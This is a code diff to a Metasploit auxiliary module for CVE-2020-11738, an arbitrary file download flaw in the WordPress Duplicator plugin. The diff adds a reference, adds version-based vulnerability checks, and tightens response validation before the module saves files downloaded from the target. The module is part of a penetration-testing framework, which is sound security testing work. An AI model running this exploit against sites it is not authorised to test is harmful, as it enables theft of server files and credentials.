@@ -4,9 +4,9 @@
 ##
 
 class MetasploitModule < Msf::Auxiliary
-  include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::HTTP::Wordpress
   include Msf::Auxiliary::Scanner
+  include Msf::Auxiliary::Report
 
   def initialize(info = {})
     super(
@@ -21,7 +21,8 @@ class MetasploitModule < Msf::Auxiliary
         'References' => [
           ['CVE', '2020-11738'],
           ['WPVDB', '10078'],
-          ['URL', 'https://snapcreek.com/duplicator/docs/changelog']
+          ['URL', 'https://snapcreek.com/duplicator/docs/changelog'],
+          ['URL', 'https://www.wordfence.com/blog/2020/02/active-attack-on-recently-patched-duplicator-plugin-vulnerability-affects-over-1-million-sites/']
         ],
         'Author' => [
           'Ramuel Gall', # Vulnerability discovery
@@ -45,8 +46,20 @@ class MetasploitModule < Msf::Auxiliary
     )
   end
 
-  def check
-    check_plugin_version_from_readme('duplicator_download', '1.3.27', '1.3.24')
+  def check_host(_ip)
+    result = check_plugin_version_from_readme('duplicator', '1.3.28', '1.3.24')
+    version = result.details[:version]
+    case result.code
+    when 'appears'
+      Exploit::CheckCode::Appears("Duplicator #{version} predates the fixed version 1.3.28", details: result.details)
+    when 'safe'
+      Exploit::CheckCode::Safe("Duplicator #{version} is outside this module's supported affected range", details: result.details)
+    else
+      result
+    end
+  rescue Rex::ConnectionError, Rex::TimeoutError, OpenSSL::SSL::SSLError => e
+    elog('Duplicator version request failed', error: e)
+    Exploit::CheckCode::Unknown('Duplicator version request failed to connect or complete')
   end
 
   def run_host(ip)
@@ -64,9 +77,29 @@ class MetasploitModule < Msf::Auxiliary
                     }
     })
 
-    fail_with Failure::Unreachable, 'Connection failed' unless res
-    fail_with Failure::NotVulnerable, 'Connection failed. Nothing was downloaded' if res.code != 200
-    fail_with Failure::NotVulnerable, 'Nothing was downloaded. Change the DEPTH parameter' if res.body.empty?
+    fail_with(Failure::Unreachable, 'Duplicator download request did not receive a response') unless res
+    if [401, 403].include?(res.code)
+      fail_with(Failure::NoAccess, "Duplicator download request was denied (HTTP #{res.code})")
+    end
+    fail_with(Failure::UnexpectedReply, "Duplicator download request returned HTTP #{res.code}") unless res.code == 200
+    fail_with(Failure::UnexpectedReply, 'Duplicator download did not include byte data') unless res.body.is_a?(String)
+
+    # The vendor sends this envelope only for actual files, including files
+    # with zero bytes. Error text is not a reliable test of arbitrary contents.
+    disposition = res.headers['Content-Disposition'].to_s.b.strip
+    attachment = disposition.split(';', 2).first.to_s.strip.casecmp?('attachment')
+    has_filename = disposition.match?(/;\s*filename\s*=\s*(?:"(?:\\.|[^"\\\r\n])+"|[^\s;"\r\n]+)\s*(?:;|\z)/i)
+    content_type = res.headers['Content-Type'].to_s.split(';', 2).first.to_s.strip
+    unless attachment && has_filename && !disposition.match?(/[\r\n]/) && content_type.casecmp?('application/octet-stream')
+      fail_with(Failure::NotVulnerable, 'Response was not a Duplicator file download; verify FILEPATH and DEPTH')
+    end
+
+    # Rex has already decoded chunked and close-delimited responses, which
+    # need not carry Content-Length. Validate it when the server provides it.
+    length = res.headers['Content-Length']
+    if length && (!length.to_s.strip.match?(/\A\d+\z/) || length.to_i != res.body.bytesize)
+      fail_with(Failure::UnexpectedReply, 'Duplicator download length did not match the received bytes')
+    end
 
     print_status('Downloading file...')
     print_line("\n#{res.body}\n")
@@ -81,5 +114,8 @@ class MetasploitModule < Msf::Auxiliary
       fname
     )
     print_good("File saved in: #{path}")
+  rescue Rex::ConnectionError, Rex::TimeoutError, OpenSSL::SSL::SSLError => e
+    elog('Duplicator download request failed', error: e)
+    fail_with(Failure::Unreachable, 'Duplicator download request failed to connect or complete')
   end
 end
